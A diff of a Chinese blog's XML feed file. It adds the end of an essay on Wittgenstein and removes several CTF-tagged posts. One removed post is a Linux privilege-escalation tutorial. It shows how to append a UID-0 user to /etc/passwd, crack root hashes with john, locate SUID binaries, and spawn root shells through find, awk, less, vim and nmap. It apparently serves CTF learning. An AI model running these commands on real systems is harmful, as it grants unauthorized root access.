+<p> 为什么不可说的是最重要的? 引用战时笔记中的一句话：“伦理学不处理世界。正如逻辑一样， 伦理学必定是世界的一个条件。”所谓条件的意思是， 如果没有它， 世界将不成其为世界， 你说它重要不重要?</p>
+<h3 id="”梯子“"><a href="#”梯子“" class="headerlink" title="”梯子“"></a>”梯子“</h3><p>在这个意义上我们甚至可以说，《逻辑哲学论》并非一本关于逻辑的著作，而是一本关于罪及与之相关的伦理、美、生活的意义的著作。虽然维特根斯坦谈论最多的是逻辑， 但逻辑只是梯子， 真正重要的东西在楼上，一旦登上了楼， 就可以撤掉梯子了。</p>
+<p>在“6.52”这一节中， 维特根斯坦说：“我们觉得， 即使一切可能的科学问题都已得到解答， 人生问题也还完全未被触及。”</p>
+<h3 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h3><p>全书第七章只有一句话：</p>
+<p><strong>“<u>对于不可说的东西我们必须保持沉默。</u>”</strong></p>
+<p>————————————————————————————————————————</p>
+<h2 id="3-后期维特根斯坦——《哲学研究》"><a href="#3-后期维特根斯坦——《哲学研究》" class="headerlink" title="3.后期维特根斯坦——《哲学研究》"></a>3.后期维特根斯坦——《哲学研究》</h2><p>维特根斯坦反维特根斯坦：</p>
+<p>•《哲学研究》</p>
+<h3 id="反本质主义："><a href="#反本质主义：" class="headerlink" title="反本质主义："></a>反本质主义：</h3><p>不要追求走出<u>柏拉图的洞穴</u>，哲学不用追求本质，追求本质是一种“<strong>哲学病</strong>”！</p>
+<p>打个比方，当有人问我们“什么是金星”的时候， 我们会非常自信地把手指向天际， 告诉他们：“喏， 就是那颗最亮的星星。”可是当有人问“什么是时间”的时候， 我们试图去寻找像金星一样的时间实体， 却发现自己茫然失措， 找不着北。</p>
+<p>为什么会出现这样的困惑? 因为我们被这两个表达式表面上的一致性给迷惑了， 以为“什么是金星”和“什么是时间”问的是同一类型的问题， 所以我们也就很自然地像寻找金星那样去寻找作为实体的时间。其实， 表面上一致的问题并不一定是同一类型的问题。</p>
+<p> 类似的诱惑无处不在， 不管是哲学家还是普通人都难以幸免。仍旧举上一讲的例子， 当说到工具二字的时候， 我们会情不自禁地想在各种工具之间寻找“共同之处”，与此类似的是， 当我们把语言看成是各种不同类型的语言游戏时， 又会忍不住去想：什么是游戏之为游戏的“共同之处”? 我们似乎总是倾向于要去总结一些什么，仿佛这么做才显得很哲学。</p>
+<p>也就是说，我们不应该对一些概念下定义，自以为得到了本质。</p>
+<h3 id="哲学冲动："><a href="#哲学冲动：" class="headerlink" title="哲学冲动："></a>哲学冲动：</h3><p>设想有人说:“所有的工具都是用来改变某种东西的，例如，锤子改变钉子的位置，锯子改变板子的形状，等等。”–尺子改变的是什么?胶水瓶和钉子改变的是什么?“改变我们对某样东西的了解，改变胶的温度和箱子的稳固程度。”–表达式是弄得一致了，但我们得到了什么呢?</p>
+<p>那些有着哲学冲动的人就试图用“改变”这个概念来定义工具的本质，可是这只是一种幻觉，它的确把表达式弄得一致了，因为所有的工具好像在改变什么，但是维特根斯坦反问，这真的有助于加深我们对工具的理解吗?</p>
+<p>维特根斯坦说，我们要放弃一种幻觉，以为我们可以抓住语言的无可与之相比的本质，“其实，只要‘语言’、‘经验’、‘世界’这些词有用处，它们的用处一定像‘桌子’、‘灯’、‘门’这些词一样卑微”。</p>
+<h3 id="”完全的黑暗“"><a href="#”完全的黑暗“" class="headerlink" title="”完全的黑暗“"></a>”完全的黑暗“</h3><p>奥古斯丁有句名言:“那么，什么是时间呢?如果没有谁问我，我倒还知道它是什么;可是，当我被问及它是什么，并试着解释时，我却糊涂了。”对此，维特根斯坦评论说:“没有谁问我们的时候我们还知道，可是要给它们一个解释时又不知道的东西，正是我们需要提醒自己注意的东西。”因为这些东西诱使我们以科学的方式提出问题并回答问题，“什么是时间”这个问题与“什么是金星”，或者“氢的比重是多少”只具有表面的相似性，如果我们看不到它们的<strong>差异性</strong>，我们就会被带入“<strong>完全的黑暗</strong>”之中。</p>
+<h3 id="“家族相似性”"><a href="#“家族相似性”" class="headerlink" title="“家族相似性”"></a>“家族相似性”</h3><p>在《哲学研究》第66节中，维特根斯坦问道:“棋类游戏，牌类游戏，球类游戏，角力游戏，它们的共同之处是什么?”然后，他立刻自我反驳道:“一不要说:它们一定有某种共同之处，否则它们不会都叫做游戏。’”</p>
+<p>维特根斯坦给出的建议是“不要想，而要看”，看到它们之间的“相似之处”和“亲缘关系”，而不是想象中的“共同之处”。</p>
+<p>那么游戏之间到底是什么关系呢？维特根斯坦说:“我想不出比‘家族相似’更好的说法。</p>
+<p>讨论到这里,我们可以说,各种“游戏”构成了一个家族,各种“工具”构成了另一个家族，我们之所以把这类活动称为游戏，把那类对象称为工具，不是因为在它们的背后存在着所谓的本质(想想亚里士多德)，也不是因为我们可以对它们进行普遍定义(想想苏格拉底)，而是因为它们之间存在着“家族相似性”。</p>
+<h3 id="让一切如其所是："><a href="#让一切如其所是：" class="headerlink" title="让一切如其所是："></a>让一切如其所是：</h3><p>蒙克说“人们常常引用维特根斯坦谈哲学的话——哲学‘让一切如其所是’。但人们常常看不到，在力求什么也不改变，只改变我们看待事物的方式时，维特根斯坦试图改变一切。”</p>
+<p><strong>就这样，维特根斯坦做到了什么也没有改变，可一切又都改变了。</strong></p>
+<p>————————————————————————————————————————</p>
+<p>1951年4月28日，维特根斯坦去世，留给这个世界的最后一句话是：</p>
+<p><em>“告诉他们我度过了极好的一生”</em></p>
+]]></content>
+      <categories>
+        <category>philosophy</category>
+      </categories>
+      <tags>
+        <tag>philosophy</tag>
+        <tag>Wittgenstein</tag>
       </tags>
   </entry>
   <entry>
@@ -2067,506 +2700,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux提权浅析</title>
-    <url>/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h1><p><code>/etc/passwd</code>和 <code>/etc/shadow</code>文件是 Linux 系统登录认证的关键文件，如果系统运维人员对 <code>passwd</code>或 <code>shadow</code>文件的内容或权限配置有误，则可以被利用来进行系统提权。</p>
-<p>我们先了解一下 <code>/etc/passwd</code>内容的含义：</p>
-<p>Linux 密码信息保存在两个文件中，分别为：<code>/etc/passwd</code>和 <code>/etc/shadow</code></p>
-<p><code>/etc/passwd</code>文件用于保存用户信息，<strong>每一行代表一个用户</strong>，每一行通过冒号 <code>:</code>分为七个部分:</p>
-<ol>
-<li>用户名</li>
-<li>密码，若为 <code>x</code>则表示密码保存在<code>/etc/shadow</code></li>
-<li>UID，0 代表 root</li>
-<li>GID，表示所在组</li>
-<li>描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other</li>
-<li>用户主目录</li>
-<li>默认 shell 类型</li>
-</ol>
-<p>例如，假设 <code>/etc/passwd</code>文件中其中一行信息如下：</p>
-<p><img src="1607657766_5fd2e926952afffe8e697.png" alt="1607657766_5fd2e926952afffe8e697"></p>
-<p>其含义解读如下：</p>
-<p>​	*用户名：test-user</p>
-<p>​	*密码保存在 <code>/etc/shadow</code>中</p>
-<p>​	*UID 为 1001</p>
-<p>​	*GID 为 1001</p>
-<p>​	*描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]</p>
-<p>​	*用户主目录为 <code>/home/test-user</code></p>
-<p>​	*默认 shell 为 <code>/bin/bash</code></p>
-<p>因此在登陆时候的权限是通过第三个字段 <code>UID</code>和第四个字段 <code>GID</code>确定。其中 <code>UID=0</code>代表 root 用户</p>
-<p><strong>如果我们能够对 <code>/etc/passwd</code>文件内容进行伪造、篡改，那就能很轻易的登录成功并获取任意用户权限。</strong></p>
-<p>所以，获取passwd的写入权限十分重要</p>
-<p>通常来说，通过 <code>/etc/passwd</code>提权的方法有两种：</p>
-<ol>
-<li>如果具有 <code>/etc/passwd</code>的 <strong>w</strong> (写入) 权限，可以直接添加一个 root 权限的用户</li>
-<li>如果 <code>/etc/passwd</code>中存储 root 用户密码哈希，可以使用 john 进行破解</li>
-</ol>
-<h3 id="场景一：-etc-passwd-具有写权限"><a href="#场景一：-etc-passwd-具有写权限" class="headerlink" title="场景一：&#x2F;etc&#x2F;passwd 具有写权限"></a>场景一：&#x2F;etc&#x2F;passwd 具有写权限</h3><p>查看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<p>如果有 <code>--wx--xrwx</code> 意味着我们具有写入权限，接下来我们需要做的就是</p>
-<p><strong>自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 <code>UID</code>设置为 <code>0</code>，此时我们登陆就可以获取 root 权限。</strong></p>
-<p>查看 passwd 文件中 root 用户数据的格式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep root</span><br></pre></td></tr></table></figure>
-
-<p>结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>先设置用户名，如syl-passwd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syl-passwd:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>设置密码，由于密码并不是明文而是经过 hash 算法加密之后的密文字符串，我们使用 <code>openssl</code>套件</p>
-<p>使用 <code>openssl</code>创建一个密码为 pass123 的 linux hash，命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt ignite pass123</span><br><span class="line">#-1 ：使用 MD5 hash 算法</span><br><span class="line">#-salt ：对 hash 算法加 &quot;盐&quot;</span><br></pre></td></tr></table></figure>
-
-<p>计算得到密码$1$ignite$3eTbJm98O9Hz.k1NTdNxe1，接着构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>添加到passwd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br><span class="line">#必须使用单引号，不能使用双引号</span><br><span class="line">#使用 &gt;&gt;，而不是 &gt;</span><br></pre></td></tr></table></figure>
-
-<p>这样即添加成功，也可以再次查看一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep syl-passwd</span><br></pre></td></tr></table></figure>
-
-<p>接下来su syl-passwd切换到 syl-passwd 用户，密码为 pass123即可拿到权限</p>
-<h3 id="场景二：-etc-passwd-存储用户密码-hash"><a href="#场景二：-etc-passwd-存储用户密码-hash" class="headerlink" title="场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash"></a>场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash</h3><p>一样查看读写权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<p>但是发现权限配置都是正确的，普通用户只具有 <code>/etc/passwd</code>文件的<strong>读</strong>权限。</p>
-<p>接下来查看 <code>/etc/passwd</code>文件的内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>结果发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>中间的$1$ignite$J98A8EVPG1O40.WnwrPEM1即是root的密码哈希值，接下来所做的就是john了</p>
-<p>先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash&#x27; &gt; ~/hash.txt</span><br><span class="line"># 此处必须单引号</span><br></pre></td></tr></table></figure>
-
-<p>然后就john：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john ~/hash.txt</span><br></pre></td></tr></table></figure>
-
-<p>最后得到密码是hello</p>
-<p>接下来就一样了，su root，提权。</p>
-<h1 id="shadow提权"><a href="#shadow提权" class="headerlink" title="shadow提权"></a>shadow提权</h1><p>shadow提权与passwd类似</p>
-<p>都是获取root密码的哈希值然后进行爆破</p>
-<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p><strong>什么是suid提权？</strong></p>
-<p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
-<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
-<p>linux引入了3个文件来管理用户组：</p>
-<ol>
-<li>&#x2F;etc&#x2F;passwd存放用户信息。</li>
-<li>&#x2F;etc&#x2F;shadow存放用户密码信息。</li>
-<li>&#x2F;etc&#x2F;group存放组信息</li>
-</ol>
-<p>利用原理：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。</p>
-<h2 id="如何设置suid"><a href="#如何设置suid" class="headerlink" title="如何设置suid"></a>如何设置suid</h2><p>列出所有文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>
-
-<p>设置suid：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod u+s filename #设置suid</span><br><span class="line">chmod u-s filename #去除suid</span><br></pre></td></tr></table></figure>
-
-<p>如果文件从<code>-rw</code>变成了<code>-rwS</code>说明添加上了suid权限</p>
-<p>注意：</p>
-<ul>
-<li>只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义</li>
-<li>命令执行者要对该程序文件拥有执行(x)权限才能使用</li>
-<li>SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</li>
-</ul>
-<p>具有suid权限的二进制可执行文件有：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h2><p>查找系统上运行的suid文件，且查找具有root权限的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># /表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line"># -perm 表示搜索随后的权限</span><br><span class="line"># -u = s表示查找root用户拥有的文件</span><br><span class="line"># -type表示我们正在寻找的文件类型</span><br><span class="line"># f 表示常规文件，而不是目录或特殊文件</span><br><span class="line"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line"># &gt;表示重定向</span><br><span class="line"># /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>
-
-<p>查找如下：</p>
-<img src="屏幕截图 2025-01-27 160340.png" alt="屏幕截图 2025-01-27 160340" style="zoom:80%;">
-
-<p>ls一下看看是否设置了suid权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /usr/bin/su</span><br><span class="line">#查看/usr/bin/su有无suid权限</span><br></pre></td></tr></table></figure>
-
-<p>如果看到确实设置了suid权限，而且属主为root，现在我们就可以利用我们之前提到的suid可执行二进制文件从而进行提权。</p>
-<h2 id="进行提权"><a href="#进行提权" class="headerlink" title="进行提权"></a>进行提权</h2><p><strong>这里的前提都是要有suid权限</strong></p>
-<p>如果之前查找到的<code>usr/bin/find</code>具有root权限，就用find命令进行提权</p>
-<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find filename -exec whoami \; -quit</span><br><span class="line"># root</span><br><span class="line">find filename -exec /bin/sh -p \; -quit</span><br><span class="line"># whoami</span><br><span class="line"># root</span><br><span class="line"></span><br><span class="line"># 这里的filename对应的文件要有suid权限，比如之前看到/usr/bin/su有suid权限这里就是/usr/bin/su</span><br></pre></td></tr></table></figure>
-
-<p>还有一种差不多的提权方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span><br><span class="line">touch 1.txt #创建1.txt</span><br><span class="line">/usr/bin/find 1.txt -exec whoami \;</span><br></pre></td></tr></table></figure>
-
-<p>好像也可以：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /etc/passwd -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure>
-
-<p>如果最后出了个<code>root</code>就说明提权成功了</p>
-<p>同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：</p>
-<table>
-<thead>
-<tr>
-<th align="left">suid文件</th>
-<th align="left">提权命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;bash</td>
-<td align="left">bash -p</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;csh</td>
-<td align="left">csh -b</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;sh</td>
-<td align="left">sh -p</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;ksh</td>
-<td align="left">ksh -p</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;zsh</td>
-<td align="left">zsh</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;find</td>
-<td align="left">find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;awk</td>
-<td align="left">awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;man</td>
-<td align="left">!&#x2F;bin&#x2F;bash</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;more</td>
-<td align="left">!&#x2F;bin&#x2F;bash</td>
-</tr>
-</tbody></table>
-<p><strong>利用相关命令均可在这个网站上查询</strong>：<a href="https://gtfobins.github.io/">GTFOBins</a></p>
-<h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><p>适用版本：nmap2.02至5.21。</p>
-<p>nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。</p>
-<p>首先是进入nmap交互模式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
-
-<p>之后利用命令进行提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line"></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="less-more"><a href="#less-more" class="headerlink" title="less&#x2F;more"></a>less&#x2F;more</h3><p>使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用<code>!</code>命令进入shell。</p>
-<p>less与more相似，以less为例</p>
-<p>less是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>之后进入交互界面，输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VISUAL=&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot; less /etc/profile</span><br><span class="line">v</span><br><span class="line"></span><br><span class="line">less /etc/profile</span><br><span class="line">v:shell</span><br></pre></td></tr></table></figure>
-
-<p>就可以进入交互界面然后写入shell的</p>
-<h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><p>nano进入shell页面似乎比较简单</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nano</span><br><span class="line">ctrl + R</span><br><span class="line">ctrl + X</span><br><span class="line">#shell</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp&#x2F;mv"></a>cp&#x2F;mv</h3><p>以cp为例</p>
-<p>主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">#qszd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt test testaaa</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su - test</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h3><p>vim为例</p>
-<p>首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim.tiny /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!/bin/sh</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="其他提权"><a href="#其他提权" class="headerlink" title="其他提权"></a>其他提权</h1><h2 id="通过查询历史记录从而获得信息泄露的信息"><a href="#通过查询历史记录从而获得信息泄露的信息" class="headerlink" title="通过查询历史记录从而获得信息泄露的信息"></a>通过查询历史记录从而获得信息泄露的信息</h2><p>利用以下命令可以获取</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure>
-
-<p>这个命令可以查看当前用户使用过的历史命令</p>
-<p>有可能会得到root登录的密码</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VNCTF2025misc复现</title>
-    <url>/2025/02/VNCTF2025misc%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>这个比赛的misc真是难，除了一道签到之外几乎全是区块链和ai，唯一一道的取证还是安卓取证，而且还模拟的真实取证过程。。</p>
-<p>打的我道心破碎了要。。。</p>
-<h1 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h1><p>简单的misc签到题</p>
-<h1 id="Echo-Flowers"><a href="#Echo-Flowers" class="headerlink" title="Echo Flowers"></a>Echo Flowers</h1>]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>WP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>awd初体验</title>
-    <url>/2024/12/awd%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><u>前言</u></h1><p>哎，，再次感到misc果然还是要会点web或者re才行</p>
-<p>这个awd会给你一个服务器需要你ssh连接起来，连起来之后需要tar下html里面的东西，然后查杀漏洞，维护，攻击别人的。</p>
-<h1 id="以bugku的awd为例"><a href="#以bugku的awd为例" class="headerlink" title="以bugku的awd为例"></a><u>以bugku的awd为例</u></h1><p>报名比赛后能得到一些东西，比如ip白名单，账号密码，token，虚拟ip等</p>
-<p>ip白名单——队长加的队员ip</p>
-<p>账号密码——一会连ssh有用（以<code>：</code>分隔）</p>
-<p>token——提交flag时用</p>
-<p>虚拟ip——连ssh，注意端口是2222</p>
-<h2 id="使用Tabby连接"><a href="#使用Tabby连接" class="headerlink" title="使用Tabby连接"></a>使用Tabby连接</h2><p>项目地址： <a href="https://tabby.sh/">https://tabby.sh/</a> 注意要下windows的（tabby基础讲解： <a href="https://blog.csdn.net/weixin_45417821/article/details/122579794?ops_request_misc=%257B%2522request%255Fid%2522%253A%25223a71448c947f5696c8f39480ad809de2%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=3a71448c947f5696c8f39480ad809de2&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122579794-null-null.142%5Ev100%5Epc_search_result_base8&utm_term=tabby&spm=1018.2226.3001.4187">这里</a>）</p>
-<p>打开后点开<code>设置/配置与连接</code></p>
-<img src="屏幕截图 2024-12-20 231606.png" alt="屏幕截图 2024-12-20 231606" style="zoom:75%;">
-
-<p>点击<code>新建/新配置</code>，选择<code>ssh连接</code></p>
-<p>看到一个空白页面，填写：</p>
-<p>名称—主机—端口—用户名—密码</p>
-<p>如下：</p>
-<img src="屏幕截图 2024-12-20 231918.png" alt="屏幕截图 2024-12-20 231918" style="zoom:75%;">
-
-<p>然后点击新建页面旁边的那个框框，再选择刚刚建的ssh就可以开始连接了</p>
-<img src="屏幕截图 2024-12-20 232210.png" alt="屏幕截图 2024-12-20 232210" style="zoom:75%;">
-
-<p>等一会就连接成功了</p>
-<h3 id="SFTP传输工具"><a href="#SFTP传输工具" class="headerlink" title="SFTP传输工具"></a>SFTP传输工具</h3><p>tabby是自带sftp工具的，连接成功后在右上角就能看到</p>
-<p>点开后能弹出服务器上的目录，如果想下载里面的一些东西可以直接点击会出现保存文件的提示，然后保存就行</p>
-<p>如果想上传文件可以直接拖拽文件，也能点右上角的<code>upload</code></p>
-<h3 id="html相关下载——tar命令"><a href="#html相关下载——tar命令" class="headerlink" title="html相关下载——tar命令"></a>html相关下载——tar命令</h3><p>连接成功之后可以打包下载html里的东西了，在<code>var/www/html</code>里。</p>
-<p>但是html是无法直接下的，那怎么办呢？使用<code>tar</code>命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf myfolder.tar.gz /var/www/html/*</span><br><span class="line"># 这个命令会打包html里的所有东西</span><br><span class="line">tar -czvf web.tar.gz ./*</span><br><span class="line"># 打包当前目录下所有东西到当前文件夹下</span><br></pre></td></tr></table></figure>
-
-<p>打包完成的东西在<code>home</code>的一个文件夹里（这里是忘了具体在哪了。。）</p>
-<p>然后就能看到一个<code>myfolder.tar.gz</code>或者<code>web.tar.gz</code>，直接点击保存下来就好</p>
-<h3 id="查找漏洞-修改-上传"><a href="#查找漏洞-修改-上传" class="headerlink" title="查找漏洞+修改+上传"></a>查找漏洞+修改+上传</h3><p>保存下来的html文件夹可以用<code>D盾</code>来扫描漏洞，然后找到对应漏洞，修改。</p>
-<p>这里可以直接在tabby上的服务器文件里修改，或者本地修改完再上传到服务器上</p>
-<p>改完漏洞就能加固我们的防御了。</p>
-<h3 id="沙箱跑木马"><a href="#沙箱跑木马" class="headerlink" title="沙箱跑木马"></a>沙箱跑木马</h3><p>我们可以利用在线沙箱来跑恶意代码，顺便让它帮我们分析一下</p>
-<p>安恒云沙箱： <a href="https://sandbox.dbappsecurity.com.cn/">安恒云沙箱-下一代沙箱的领航者</a></p>
-<p>如果是哥斯拉，蚁剑，冰蝎，天蝎，之类的常规工具可以直接分析出来</p>
-]]></content>
-      <categories>
-        <category>AWD</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>wsl启动出错</title>
-    <url>/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/</url>
-    <content><![CDATA[<h1 id="wsl启动出错"><a href="#wsl启动出错" class="headerlink" title="wsl启动出错"></a>wsl启动出错</h1><p><strong>启动出错如下：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于未安装所需的特性，无法启动操作。</span><br><span class="line">错误代码: Wsl/Service/CreateInstance/CreateVm/HCS/HCS_E_SERVICE_NOT_AVAILABLE</span><br><span class="line">Press any key to continue...</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="1-启用了-WSL-所需的功能"><a href="#1-启用了-WSL-所需的功能" class="headerlink" title="1.启用了 WSL 所需的功能"></a>1.启用了 WSL 所需的功能</h2><p>可以以管理员身份在powershell输入以下命令：</p>
